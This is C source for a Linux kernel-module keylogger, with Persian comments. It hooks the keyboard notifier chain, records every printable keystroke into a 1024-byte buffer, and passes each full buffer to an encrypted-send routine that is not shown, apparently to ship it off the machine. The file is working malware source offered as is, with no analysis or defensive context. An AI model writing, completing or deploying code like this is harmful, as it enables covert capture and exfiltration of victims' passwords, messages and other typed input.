#include <linux/input.h>
#include <linux/keyboard.h>
#include "defines.h"

static struct notifier_block nb;
static char log_buffer[1024];
static int log_index = 0;

// تابع ثبت کلید
int keylogger_notify(struct notifier_block *nblock, 
                    unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    
    if (code == KBD_KEYSYM && param->down) {
        char key = param->value;
        if (isprint(key)) {
            log_buffer[log_index++] = key;
            
            // ارسال هر 1024 بایت
            if (log_index >= sizeof(log_buffer) - 1) {
                send_encrypted_log(log_buffer, log_index);
                log_index = 0;
            }
        }
    }
    return NOTIFY_OK;
}

// راه‌اندازی کیلاگر
void init_keylogger(void) {
    nb.notifier_call = keylogger_notify;
    register_keyboard_notifier(&nb);
    pr_info("Keylogger activated\n");
}

// غیرفعال‌سازی کیلاگر
void disable_keylogger(void) {
    unregister_keyboard_notifier(&nb);
    pr_info("Keylogger deactivated\n");
}
